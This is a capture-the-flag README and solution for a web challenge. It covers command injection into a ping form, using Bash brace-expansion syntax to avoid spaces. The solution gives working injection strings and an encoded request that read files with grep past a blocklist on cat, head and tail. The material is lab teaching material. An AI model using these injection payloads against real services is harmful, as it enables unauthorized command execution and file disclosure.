# [Web 100] Network Pong

This challenge utilizes non-standard command injection without the use of spaces.

## Building

Please deploy to run uWSGI, and ensure Bash is located at `/bin/bash`.


## Solution

First, we will run it with an intended payload (say, `1.1.1.1`), and notice it runs fine.

If we try to add a semicolon to the end of the payload, we get a better idea of what is going on:

```bash
/bin/bash: -c: line 0: syntax error near unexpected token `}'
/bin/bash: -c: line 0: `{ping,-c,1,1.1.1.1;}'
```

In Bash, you can use a curly-brace syntax to run commands instead of using the standard space-deliminated syntax. However, we need to somehow end the Ping command and start another command.

Something like `1.1.1.1} && {cat,flag.txt` seems appealing, but we see we get an error ("Please only enter the IP or domain!"). Removing spaces, we get another error:
```bash
1.1.1.1}&&{cat,flag.txt
```
> Error: Do not mention body parts, felines, or body parts of felines.

This is a somewhat-lighthearted way to say that *we cannot use `cat`, `head`, or `tail`*. However, `grep` is fair game:

```bash
1.1.1.1}&&{grep,-r,sun
```

This returns our flag:

> PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.

>64 bytes from 1.1.1.1: icmp_seq=1 ttl=57 time=14.1 ms

>--- 1.1.1.1 ping statistics ---

>1 packets transmitted, 1 received, 0% packet loss, time 0ms

> rtt min/avg/max/mdev = 14.195/14.195/14.195/0.000 ms

> flag.txt:sun{temp_flag}

To test, make sure the flag appears on this request:

> GET /?ip=1.1.1.1%7D%26%26%7Bgrep%2C-r%2Csun&submit=Play

## Flag Customization

The flag can be any file accessible to the challenge process, because `grep`.
